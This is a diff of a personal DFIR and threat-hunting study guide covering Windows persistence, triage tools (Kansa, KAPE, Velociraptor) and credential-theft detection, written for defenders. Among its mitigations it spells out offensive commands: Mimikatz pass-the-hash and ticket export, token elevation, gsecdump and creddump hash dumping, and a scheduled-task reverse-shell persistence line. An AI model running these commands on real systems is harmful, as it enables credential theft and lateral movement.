@@ -1,14 +1,22 @@
 <!-- no toc --> # Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis
 
-**NOTE TO SELF:** Things that I will update with my with my personal notes can be found by searching for "**UPDATE WITH MY PERSONAL NOTES HERE**"
-
-<br>
-
 - [(1) Incident Response](#1-incident-response)
   - [Incident Response Process](#incident-response-process)
   - [Dynamic Approach to Incident Response](#dynamic-approach-to-incident-response)
   - [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
   - [Attack Lifecycle](#attack-lifecycle)
+  - [Malware Persitence Locations](#malware-persitence-locations)
+    - [Common Autostart Locations](#common-autostart-locations)
+  - [Common Malware Names](#common-malware-names)
+  - [Common Malware Locations](#common-malware-locations)
+  - [Living of the Land Binaries](#living-of-the-land-binaries)
+    - [Services](#services)
+    - [Scheduled Tasks](#scheduled-tasks)
+    - [DLL Hijacking](#dll-hijacking)
+    - [Hunting DLL Hijacking](#hunting-dll-hijacking)
+    - [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
+    - [Hunting WMI Persistence](#hunting-wmi-persistence)
+    - [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
   - [IR Scripting](#ir-scripting)
     - [IR Using WMIC](#ir-using-wmic)
     - [IR Using PowerShell](#ir-using-powershell)
@@ -17,6 +25,37 @@
     - [Stacking Autoruns](#stacking-autoruns)
     - [Stacking Services](#stacking-services)
     - [Stacking WMI Filters and Consumers](#stacking-wmi-filters-and-consumers)
+  - [KAPE](#kape)
+  - [Velociraptor](#velociraptor)
+    - [Most Common VQL Data Tranformations](#most-common-vql-data-tranformations)
+    - [Essential Velociraptor Built-in Artifacts](#essential-velociraptor-built-in-artifacts)
+  - [Credential Theft Detection and Response](#credential-theft-detection-and-response)
+    - [Detecting Credential Harvesting](#detecting-credential-harvesting)
+    - [Hashes](#hashes)
+      - [Common Tools](#common-tools)
+    - [Protecting Hashes](#protecting-hashes)
+      - [Credential Availability Based on Admin Action](#credential-availability-based-on-admin-action)
+    - [Tokens](#tokens)
+      - [Token Stealing (Mimikatz)](#token-stealing-mimikatz)
+      - [Common Tools](#common-tools-1)
+    - [Protecting Tokens](#protecting-tokens)
+    - [Cached Credentials](#cached-credentials)
+      - [Common Tools](#common-tools-2)
+    - [Protecting Cached Credentials](#protecting-cached-credentials)
+    - [LSA Secrets](#lsa-secrets)
+    - [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
+      - [Common Tools](#common-tools-3)
+    - [Protecting LSA Secrets](#protecting-lsa-secrets)
+    - [Tickets - Kerberos](#tickets---kerberos)
+      - [Common Tools](#common-tools-4)
+    - [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
+    - [Kerberos Attacks](#kerberos-attacks)
+    - [Protecting Tickets](#protecting-tickets)
+    - [NTDS.DIT](#ntdsdit)
+    - [AD Enumeration](#ad-enumeration)
+      - [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
+      - [Common Tools](#common-tools-5)
+    - [Protecting Against AD Enumeration](#protecting-against-ad-enumeration)
 - [(2) Intrusion Analysis](#2-intrusion-analysis)
   - [Evidence of Execution](#evidence-of-execution)
     - [Prefetch](#prefetch)
@@ -184,34 +223,6 @@
   - [Supertimeline Analysis](#supertimeline-analysis)
     - [Questions to Answer](#questions-to-answer)
     - [Filtering](#filtering)
-- [Threat Hunting](#threat-hunting)
-  - [Common Malware Names](#common-malware-names)
-  - [Common Malware Locations](#common-malware-locations)
-  - [Living of the Land Binaries](#living-of-the-land-binaries)
-  - [Persitence Locations](#persitence-locations)
-    - [Common Autostart Locations](#common-autostart-locations)
-    - [Services](#services)
-    - [Scheduled Tasks](#scheduled-tasks)
-    - [DLL Hijacking](#dll-hijacking)
-    - [Hunting DLL Hijacking](#hunting-dll-hijacking)
-    - [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
-    - [Hunting WMI Persistence](#hunting-wmi-persistence)
-    - [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
-  - [Lateral Movement](#lateral-movement)
-    - [Detecting Credential Harvesting](#detecting-credential-harvesting)
-    - [Hashes](#hashes)
-    - [Credential Availability on Targets](#credential-availability-on-targets)
-    - [Tokens](#tokens)
-    - [Cached Credentials](#cached-credentials)
-    - [LSA Secrets](#lsa-secrets)
-    - [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
-    - [Tickets - Kerberos](#tickets---kerberos)
-    - [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
-    - [Kerberos Attacks](#kerberos-attacks)
-    - [NTDS.DIT](#ntdsdit)
-    - [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
-- [Misc](#misc)
-  - [Decode Base64](#decode-base64)
 - [(5) Anti-Forensics Detection](#5-anti-forensics-detection)
   - [Overview](#overview-1)
     - [Filesystem](#filesystem)
@@ -304,11 +315,11 @@
     - [Filter and Review SMB](#filter-and-review-smb)
 
 
-<br>
+
 
 ---
 
-<br>
+
 
 # (1) Incident Response
 
@@ -353,21 +364,254 @@
 ## Dynamic Approach to Incident Response
 ![DAIR Framework](<files/DAIR Framework.png>)
 
-<br>
+
 
 ## Incident Response Hierarchy of Needs
 <img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />
 
 [Ref: Matt Swann](https://github.com/swannman/ircapabilities)
 
-<br>
+
 
 
 ## Attack Lifecycle
 <img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />
 
-<br>
 
+
+
+## Malware Persitence Locations
+
+* Malware needs  to hide, but it also must survive!  
+* Where is the adversary likely to go and beat them to that location? Sit, wait, and watch\!
+
+* Most common areas of persistence (~98% of all persistence is captured in the first 6 steps)  
+  * AutoStart Locations  
+  * Service Creation/Replacement  
+  * Service Failure Recovery  
+  * Scheduled Tasks  
+  * DLL Hijacking  
+  * WMI Event Consumers  
+  * More Advanced and Rare (Group Policy, MS Office Add-In, BIOS Flashing)
+
+* [Sysinternals Tools](https://live.sysinternals.com/)
+
+* [Sysinternals Info](https://learn.microsoft.com/en-us/sysinternals/?source=recommendations)
+
+* Sysinternals – autorunsc.exe  
+  * Detection of AutoStart, Service Creation/Replacement, Scheduled Tasks, WMI Event Consumers
+
+ ```
+ C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
+ ```
+
+### Common Autostart Locations
+```
+NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
+NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
+SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
+SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+## Common Malware Names
+* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)
+
+
+
+## Common Malware Locations
+* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)
+
+
+
+## Living of the Land Binaries
+* [LOLBAS Project](https://lolbas-project.github.io/)  
+
+**RUNONCE.EXE**
+- Executes a Run Once Task that has been configured in the registry
+```
+Runonce.exe /AlternateShellStartup
+```
+
+**RUNDLL32.EXE**
+- Used by Windows to execute dll files
+```
+rundll32.exe AllTheThingsx64,EntryPoint
+```
+
+**WMIC.EXE**
+- The WMI command-line (WMIC) utility provides a command-line interface for WMI
+```
+wmic.exe process call create calc
+```
+
+**NETSH.EXE**
+- Netsh is a Windows tool used to manipulate network interface settings.
+```
+netsh.exe add helper C:\Users\User\file.dll
+```
+
+**SCHTASKS.EXE**
+- Schedule periodic tasks
+```
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
+```
+
+**MSIEXEC.EXE**
+- Used by Windows to execute msi files
+```
+msiexec /quiet /i cmd.msi
+```
+
+**Tools**
+* Autoruns
+* Kansa
+
+
+
+### Services
+```
+HKLM\SYSTEM\CurrentControlSet\Services
+```
+* 0x02 = Automatic
+* 0x00 = Boot Start of a Device Driver
+* "sc" command can create services
+
+**Tools**
+* Autoruns
+* "sc" command
+* Kansa
+
+
+
+### Scheduled Tasks
+- at.exe
+	- Deprecated but present in WinXP and Win7+
+	- Recorded in at.job files and schdlgu.txt (XP)
+- schtasks.exe
+	- Activitiy logged in Task Scheduler and Security Logs
+
+```powershell
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
+```
+
+Tools:
+- Autoruns
+- Kansa
+
+
+
+### DLL Hijacking
+
+DLL Search Order Hijacking
+- Place malicious file ahead of DLL in search order
+- Windows looks at Application directory prior to Windows/System32 folder
+- Look at exe's import table
+- Exception: DLLs present in the KnownDLLs Registry Key
+
+Phantom DLL Hijacking
+- Find DLLs that applications attempt to load, but doesn't exist
+
+DLL Side Loading
+- WinSXS provides a new version of a legit DLL
+
+Relative Path DLL Hijacking
+- Copy target .exe and corresponding bad .dll to a different location
+
+Common DLL Search Order
+1. DLLs already in memory
+2. Side-by-side components
+3. KnownDLLs List
+4. Directory of the application
+5. C:\Windows\System32
+6. C:\Windows\System
+7. C:\Windows
+8. Current Directory
+9. System %PATH%
+
+
+
+### Hunting DLL Hijacking
+- Machines rarely get new dlls (Application Install/Patching)
+
+File system analysis
+- Look for new or unsigned .exe/.dll files in unusual places
+
+Memory Analysis
+- Find system process or DLLs loaded from the wrong location
+
+This technique is often followed up C2 network beaconing
+
+
+
+### WMI Event Consumer Backdoors
+- Allows triggers to be set that will run scripts and executables
+- Event Filter: Trigger Condition
+- Event Consumer: Script or executable to run
+- Binding: Combine Filter and Consumer
+
+Tools
+- Kansa
+- Autoruns
+
+Discover Suspicious WMI Events
+```powershell
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter
+Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
+```
+
+
+### Hunting WMI Persistence
+- Look at consumers (CommandLine and Active Script)
+	- Correlate to Event Filter (trigger)
+- Search
+	- .exe
+	- .vbs
+	- .ps1
+	- .dll
+	- .eval
+	- ActiveXObject
+	- powershell
+	- CommandLineTemplate
+	- ScriptText
+- Common WMI Occurences
+	- SCM Event Log Consumer
+	- BVTFilter
+	- TSlogonEvents.vbs
+	- TSLogonFilter
+	- RAevent.vbs
+	- RmAssistEventFilter
+	- KernCap.vbs
+	- NETEventLogConsumer
+	- WSCEAA.exe (Dell)
+
+
+
+### Hunt and Analyze Persistence with Autoruns
+- Live System Only
+- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
+- Hashes files and can search VirusTotal for hits
+
+1. Run autorunsc
+ ```
+ C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
+ ```
+2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
+3. Filter out trusted startup locations
+	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
+	- Look for:
+		- (Not Verified)
+		- Unfamiliar Signers
+		- Blank (No Signer)
+4. Filter by Enabled (Active)
+5. Compare hashes to VirusTotal
+6. Research vendor and product listed in "Publisher" and "Description" fields
+7. Compare output to a the output of a known good machine
+
+---
 
 ## IR Scripting
 
@@ -394,7 +638,7 @@ Network Configuration
 wmic /node:10.1.1.1 nicconfig get
 ```
 
-<br>
+
 
 
 ### IR Using PowerShell
@@ -419,14 +663,17 @@ Authentication
 - Does not cache creds
 - Creds not passed to remote system (Mimikatz, Incognito)
 
-<br>
+
 
 
 ### Kansa
 **Collection**
 - [Kansa GitHub](https://github.com/davehull/Kansa)
-- Uses PowerShell scripting
-- Can remote run executables
+
+```PowerShell
+.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
+```
+
 - Modules.conf manages what scripts run
 - Omit -TargetList and Kansa will query AD for a list of computers and target all of them
 	- Requires [Remote Server Administration Tools](https://www.microsoft.com/en-us/download/details.aspx?id=39296)
@@ -434,9 +681,11 @@ Authentication
 - -PushBin required by scripts that employ 3rd party binaries (will first copy binaries to targets before running)
 - -Rmbin removes binaries after execution  
 
-```powershell
-.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
-```
+**NOTE:** use of third-party tools like `Autorunsc.exe` must include the "**# BINDEP**" (binary dependency) directive inside of the `.Modules\bin` directory to run the `Get-Autorunsc.exe.ps1` module.
+
+**Example Module.conf:**
+
+- "# BINDEP .\Modules\bin\Autorunsc.exe"
 
 **Analysis**
 - Can pre-filter and organize data
@@ -463,13 +712,13 @@ Authentication
 ```powershell
 Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
 ```
-3. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
-4. Run Kansa
+1. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
+2. Run Kansa
 ```powershell
 .\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
 ```
 
-<br>
+
 
 ## Kansa Data Stacking Collection and Analysis
 
@@ -485,7 +734,7 @@ Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
 Select-String "process name" *Autorunsc.csv
 ```
 
-<br>
+
 
 ### Stacking Services
 
@@ -505,7 +754,7 @@ Select-String "process name" *Autorunsc.csv
 ```powershell
 Select-String "tbbd05" *SvcAll.csv 
 ```
-<br>
+
 
 ### Stacking WMI Filters and Consumers
 
@@ -535,11 +784,374 @@ Select-String "PerformanceMonitor" *ConBind.csv
 Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
 ```
 
-<br>
+---
+
+## KAPE
+[Kroll Artifact Parser and Extractor (KAPE)](https://ericzimmerman.github.io/KapeDocs/#!index.md)   
+  - Is the de facto triage collection tool for incident response scenarios!
+
+  - Triage program that will target a device or storage location, find the most forensically relevant artifacts (based on your needs), and parse them within a few minutes. KAPE allows investigators to find and **prioritize the more critical systems to their case**. KAPE can be **used to collect the most critical artifacts prior to the start of the imaging process**. While the imaging completes, the data generated by KAPE can be reviewed for leads, building timelines, etc.
+  
+[KAPE Targets](https://github.com/EricZimmerman/KapeFiles/tree/master)  
+- Provides a list of customized KAPE targets that are pre-cooked and ready for remote collection. 
+
+Sample KAPE Command
+
+```
+kape.exe --tsource [DRIVE_LETTER] --target [ARTIFACT_TARGETS] --tdest C:\PATH\TO\OUTPUT
+```
+- `--tsource`: driver letter to directory search formateed as C, D:, or F:\
+- `--target`: target config to run without the extension. Get a list of all available targets with `--tlist`
+- `--tdest`: directory where files should be copied to The directory will be created if it doesn't exist.
+- `tvss`: Find, mount, and search all availabe Volume or Shadow Copies on `--tsource`.
+- `vhdx` and `vhd`: Creates a VHDX virtual hard drive from the contents of `--tdest`
+- `debug`: When true, enables debug messages.
 
 ---
 
-<br>
+## Velociraptor
+
+**NOTE:** Essentially, an advanced digital forensic and incident response tool that enhances your visibility into your endpoints for specific host analysis of a specific segment of your network.
+
+* [Velociraptor](https://github.com/Velocidex/velociraptor)
+
+* [Velociraptor Docs](https://docs.velociraptor.app/)
+
+* [Velociraptor Training](https://docs.velociraptor.app/training/)  
+
+* [Scaling Velociraptor](https://docs.velociraptor.app/blog/2021/2021-04-29-scaling-velociraptor-57acc4df76ed/)
+
+* [Velociraptor Artifacts](https://docs.velociraptor.app/exchange/)  
+  * Used to search for custom VQL queries that can be further customized for your own analyst needs!
+
+### Most Common VQL Data Tranformations
+| Data Operation | VQL Operator | Example VQL |
+|---|---|---|
+| View specific columns | `SELECT <column> FROM` | `SELECT Exe, Hash FROM source()` |
+| Expose nested JSON field | `<column>.<nested field name>` | `SELECT Exe, Hash.MD5 FROM source()` |
+| Filter for keyword | `WHERE <column> =~ 'keyword'` | `WHERE Exe =~ 'mimikatz'` |
+| Negate filter for keyword | `WHERE NOT <column> =~ 'keyword'` | `WHERE NOT Exe =~ 'svchost'` |
+| Join multiple filters | Use Boolean AND/OR | `WHERE NOT Exe =~ 'svchost' AND NOT Exe =~ 'edge'` |
+| Group like values | `GROUP BY <column>` | `GROUP BY Hash.MD5` |
+| Count occurrences | `count() AS <new column name>` | `SELECT Exe, Hash.MD5, count() AS Count FROM source()` |
+| Sort alphanumerically | `ORDER BY <column> <DESC>` | `ORDER BY Count (default order is ASCENDING)` |
+
+### Essential Velociraptor Built-in Artifacts
+
+| Filesystem Timeline | Memory Acquisition | Autoruns |
+|---|---|---|
+| Windows Timeline | Processes, DLLs | Permanent WMI Events |
+| Prefetch Timeline | VAD, Handles, Mutants | Scheduled Tasks |
+| KAPE Triage | Impersonation Tokens | Service Creations |
+| Volume Shadow Copy | Netstat, ARP | Certificate Store |
+| MFT, $130 | DNS Queries | SRUM, BAM |
+| File Finder | Event Logs | ShimCache, AmCache |
+| YARA Scanning | User ProfileList | UserAssist |
+
+---
+
+## Credential Theft Detection and Response
+
+**NOTE:** the reason why attackers aim for the DC to dump hashes is because tools are only able to dump the hashes of active sessions. The DC is able to maintain multiple sessions at one time thus providing an attacker with the maximum amount of impact
+
+**NOTE II:** The most immediate objective for an attacker is to secure the credentials to as many systems as possible whenever they first access a user/system. Without proper credentials, the attacker is UNABLE to laterally move through any portion of the network.
+
+### Detecting Credential Harvesting
+- Event Logs
+	- 4624 Logons
+	- 4720 Account Creation
+	- 4776 Local Account Auth
+	- 4672 Privileged Account Usage
+- Unix "secure"logs
+- Auditing New Accounts
+- Anomalous Logins
+	- Workstation to Workstation
+	- Sensitive Networks
+- After Hour Logins
+
+**Mitigations (Win10)**
+- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
+- Remote Credential Guard: RDP without pushing credentials to remote target
+- Device Guard (Prevent execution of untrusted code)
+
+**Hunt Notes**
+- WDigest Plaintext Credentials
+	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
+		- UseLogonCredential = "1" (Should be 0)
+
+---
+
+### Hashes
+
+- Availabe in the LSASS process
+- Can be extracted with admin privileges
+- Local account password hashes are available in the SAM hive in memory or on disk
+- Domain account hashes are present in memory during interactive sessions
+
+#### Common Tools
+* Mimikatz
+* fgdump
+* gsecdump
+* Metasploit
+* AceHash
+* PWDumpX
+* creddump
+* WCE (Windows Credential Editor)
+
+**Pash-the-Hash Attack**
+- Authenticate using a stolen account hash without knowing the cleartext password
+	- Tools: Metasploit PsExec module, WCE, and SMBshell
+- Limited to NTLM authentication
+- Often used to map shares, perform PsExec-style remote execution, and WMI
+- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
+- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
+- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
+
+**Examples**
+- Hash dump with Gsecdump
+```
+gsecdump.exe -a > 1.txt
+```
+
+- Pass the Hash (Mimikatz)
+```
+mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
+```
+
+### Protecting Hashes
+
+- Prevent admin account compromise
+- Stop remote interactive sessions with highly privileged accounts
+- Proper termination of RDP sessions
+- Win 8.1+: force the use of Restricted Admin?
+- Win 10+: deploy Remote Credential Guard
+- Upgrade to Windows 10+
+- Credential Guard
+- TsPkg, WDigest, etc.: SSO creds obsolescence
+- Domain Protected Users Group (PtH mitigation)
+
+#### Credential Availability Based on Admin Action
+
+| Admin Action | Logon Type | Credentials on Target? | Notes |
+|---|---|---|---|
+| Console logon | 2 | Yes* | *Except when Credential Guard is enabled |
+| RunAs | 2 | Yes* | *Except when Credential Guard is enabled |
+| Remote Desktop | 10 | Yes* | *Except for enabled Remote Credential Guard |
+| Net Use | 3 | No | Including /u: parameter |
+| PowerShell Remoting | 3 | No | Invoke-Command; Enter-PSSession |
+| PsExec alternate creds | 3+2 | Yes | `-u <username> -p <password>` |
+| PsExec w/o explicit creds | 3 | No |  |
+| Remote Scheduled Task | 4 | Yes | Password saved as LSA Secret |
+| Run as a Service | 5 | Yes | (w/ user account) - Password saved as LSA Secret |
+| Remote Registry | 3 | No |  |
+
+---
+
+### Tokens
+
+**NOTE:** **delegate tokens** enable domain admins to complete “double hops” essentially accessing a remote workstation, map a Share Drive from their host machine to the remote machine to pull and update patches. That connection copies their delegate token to that remote machine making the remote machine vulnerable to token stealing.
+
+- Targets user sessions and running services
+- Used for SSO
+- Attacker can impersonate user's security context
+- `SeImpersonate` privileges let tokens be copied from processes (also SYTEM or admin)
+- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
+- Often used to escalate from local to domain admin
+
+#### Token Stealing (Mimikatz)
+- Assumes attacker has local admin
+```
+mimikatz # privilege::debug
+mimikatz # token:whoami
+mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
+```
+
+#### Common Tools
+- Incognito
+- Metasploit
+- PowerShell (PowerShell Empire)
+- Mimikatz
+
+**Hunting**
+- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)
+
+### Protecting Tokens
+- Prevent admin account compromise
+- Stop remote interactive sessions with highly privileged accounts
+- Proper termination of RDP sessions
+- Win 8.1+: force the use of Restricted Admin Mode?
+- Win 10+: deploy Remote Credential Guard
+- Account designation of “Account is Sensitive and Cannot be Delegated” in Active Directory
+- Domain Protected Users security group accounts do not create delegate tokens
+
+---
+
+### Cached Credentials
+- Stored domain credentials to allow logons when off domain
+- Cached credentials hashes have to be cracked
+- Salted and case-sensitive (slow to crack)
+- Cannot be used in pass the hash
+- Stored in the SECURITY\Cache registry key
+- Admin or SYSTEM privileges required
+- Hashes cracked with John the Ripper or hashcat
+
+#### Common Tools
+- cachedump
+- Metasploit
+- PWDumpX
+- creddump
+- AceHash
+
+**Cached Credential Extraction with Creddump**
+
+```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
+```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes
+
+### Protecting Cached Credentials
+* Prevent admin account compromise
+* Limit number of cached logon accounts
+  * SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon (cachedlogonscount value)
+  * A cachedlogonscount of zero or one is not always the right answer
+* Enforce password length and complexity rules
+  * Brute force cracking is required for this attack
+* Domain Protected Users security group accounts do not cache credentials
+
+---
+
+### LSA Secrets
+
+* Used to allow services or tasks to be run without user interaction.
+* Stored in the Security hive registry key `SECURITY/Policy/Secrets`. Each secret has its own key, and a parent key within `SECURITY/Policy` that can decode the secret.
+
+### Decrypt LSA Secrets with Nishang
+- Requires Admin
+- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
+- Dump registry data with ```Get-LsaSecret.ps1```  
+
+#### Common Tools
+- Cain
+- Metasploit
+- Mimikatz
+- gsecdump
+- AceHash
+- creddump
+- PowerShell
+
+### Protecting LSA Secrets
+* Prevent admin account compromise
+* Do not employ services or schedule tasks requiring privileged accounts on low-trust systems
+* Reduce number of services that require domain accounts to execute
+  * Heavily audit any accounts that must be used
+* (Group) Managed Service AccountsDefending Credentials
+
+---
+
+### Tickets - Kerberos
+- Kerberos issues tickets to authenticated users
+- Cached in memory and valid for 10 hours
+- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
+- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
+- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)
+
+#### Common Tools
+* [Kerberoast](https://github.com/nidem/kerberoast)
+* Mimikatz
+* Windows Credential Editor (WCE)
+
+### Pass the Ticket with Mimikatz
+- Dump Tickets
+```mimikatz # sekurlsa::tickets /export```
+- Import ticket elsewhere
+```mimikatz # keberos::ptt [ticket]```
+- Now available to authenticate to throughout environment
+
+### Kerberos Attacks
+
+| Attack | Description |
+|---|---|
+| Pass the Ticket | Steal ticket from memory and pass or import on other systems |
+| Overpass the Hash | Use NT hash to request a service ticket for the same account |
+| Kerberoasting | Request service ticket for highly privileged service and crack NT hash |
+| Golden Ticket | Kerberos TGT for any account with no expiration. Survives full password reset |
+| Silver Ticket | All-access pass for a single service or computer |
+| Skeleton Key | Patch LSASS on domain controller to add backdoor password that works for any domain account |
+| DCSync | Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC |
+
+### Protecting Tickets
+
+* Credential Guard (Win10+)
+  * Domain Protected Users Group (Win8+): Some attacks
+* Remote Credential Guard (Win10+)
+  * Restricted Admin (Win8+)
+* Long and complex passwords on service accounts
+  * Change service account passwords regularly
+  * Group Managed Service Accounts are a great mitigation
+* Audit service accounts for unusual activity
+* Limit and protect Domain Admin
+  * Change KRBTGT password regularly (yearly)
+
+
+| Attack Type | Description | Mitigation |
+|---|---|---|
+| Pass the Ticket | Steal ticket from memory and pass or import on other systems | Credential Guard; Remote Credential Guard |
+| Overpass the Hash | Use NT hash to request a service ticket for the same account | Credential Guard; Protected Users Group; disable RC4 authentication |
+| Kerberoasting | Request service ticket for highly privileged service and crack NT hash | Long and complex service account passwords; Managed Service Accounts |
+| Golden Ticket | Kerberos TGT for any account with no expiration. Survives full password reset | Protect domain admin accounts; change KRBTGT password regularly |
+| Silver Ticket | All-access pass for a single service or computer | Regular computer account password updates |
+| Skeleton Key | Patch LSASS on domain controller to add backdoor password to any account | Protect domain admin accounts; smart card usage for privileged accounts |
+| DCSync | Use false DC replication to obtain hashes | Protect domain admin; audit/limit accounts with replication rights |
+
+* [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)
+
+---
+
+### NTDS.DIT
+- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
+- Encrypted but algorithm is easy to decrypt
+- Located in the \Windows\NTDS folder on Domain Controller
+- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service
+
+### AD Enumeration
+
+#### Bloodhound - Find a Path to Domain Admin
+- Active Directory relationship graphing tool
+	- Nodes: Users, Computers, Groups, OUs, GPOs
+	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
+	- Paths: A list of nodes connected by edges (Path to Domain Admin)
+	- Visualizes dangerous trust relationships and misconfigurations
+	- Reduces brute-force effort required
+	- Difficult to detect (Uses prodominantly LDAP)
+		- Uses cached LDAP connections
+
+#### Common Tools
+
+* [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)  
+  * Extracting contents from ntds.dit AD database file
+
+* [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
+
+<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />  
+
+* [GoFetch](https://github.com/GoFetchAD/GoFetch) – tool used to automatically map an attack path utilizing Bloodhound’s AD enumeration graph  
+
+* [DeathStar](https://github.com/byt3bl33d3r/DeathStar) – Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs.  
+
+* [Empire](https://github.com/BC-SECURITY/Empire) –  post-exploitation and adversary emulation framework that is used to aid Red Teams and Penetration Testers.  
+    * [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
+    * Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement
+
+* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) – a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and script
+
+
+### Protecting Against AD Enumeration
+* `BloodHound` is very stealthy in most environments. It uses LDAP requests within the enterprise to enumerate permissions making detection very difficult.
+* Use of netflow logs (tracking LDAP session)
+* Auditing Directory Service Access in AD logs
+* Using honey tokens
+* Use of EDR to detect named pipes or other heuristics
+* Inappropriate use of credentials after the theft occurs (**NOT IDEAL**)
+
+---
 
 # (2) Intrusion Analysis
 
@@ -562,7 +1174,7 @@ Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
 - Can be analyzed with PECmd.exe ```PECmd.exe -d "C:\Windows\Prefetch" --csv "G:\cases" -q```  
 - [PECmd](https://github.com/EricZimmerman/PECmd)
 
-<br>
+
 
 ### ShimCache - Application Compatibility
 - Available on workstations AND Servers
@@ -609,7 +1221,7 @@ SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache
 - Written in order of excecution or GUI discovery
 - Additional tool from Mandiant: [ShimCacheParser](https://github.com/mandiant/ShimCacheParser)
 
-<br>
+
 
 ### Amcache.hve - Application Compatibility
 ```
@@ -650,7 +1262,7 @@ amcacheparser.exe -i -f amcache.hve --csv G:\<folder>
 ```
 - Leverages allowlisting and blocklisting based on SHA1
 
-<br>
+
 
 ### Automating and Scaling Execution Analysis
 - Malware 101
@@ -687,29 +1299,29 @@ Perform least frequency of occurence analysis
 AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe'"
 ```
 
-<br>
+
 
 ## Event Logs Analysis
 
-<br>
+
 
 ### Event Log Summary
 
 | **Activity** | **Event Log** | **EID** |
